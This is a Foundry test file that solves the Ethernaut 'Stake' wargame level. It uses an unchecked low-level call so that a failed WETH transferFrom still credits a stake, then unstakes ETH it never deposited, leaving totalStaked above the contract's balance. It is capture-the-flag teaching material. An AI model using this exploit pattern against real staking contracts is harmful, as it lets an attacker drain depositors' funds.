// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/openzeppelin-ethernaut/Stake.sol";

import "src/openzeppelin-ethernaut/ERC20Impl.sol";

// 1. address.call() result isn't checked; transferFrom can fail
// 2. use a second account s.t. instance.totalStaked() > address(instance).balance
contract StakeTest is Test {
    Stake instance;
    ERC20Impl weth;

    function setUp() public {
        weth = new ERC20Impl("WETH", "WETH");
        vm.prank(msg.sender);
        instance = new Stake{value: 0.002 ether}(address(weth));
    }

    function test() public {
        assertTrue(ERC20.allowance.selector == 0xdd62ed3e);
        assertTrue(ERC20.transferFrom.selector == 0x23b872dd);

        address alice = makeAddr("alice");
        vm.startPrank(makeAddr("alice"));
        weth.approve(address(instance), type(uint256).max);

        uint256 stakeAmount = 0.0015 ether;
        instance.StakeWETH(stakeAmount);
        vm.stopPrank();

        weth.approve(address(instance), type(uint256).max);
        instance.StakeWETH(stakeAmount);
        instance.Unstake(stakeAmount);

        assertTrue(address(instance).balance > 0);
        assertTrue(instance.totalStaked() > address(instance).balance);
        assertEq(instance.Stakers(address(this)), true);
        assertEq(instance.UserStake(address(this)), 0);
    }
}
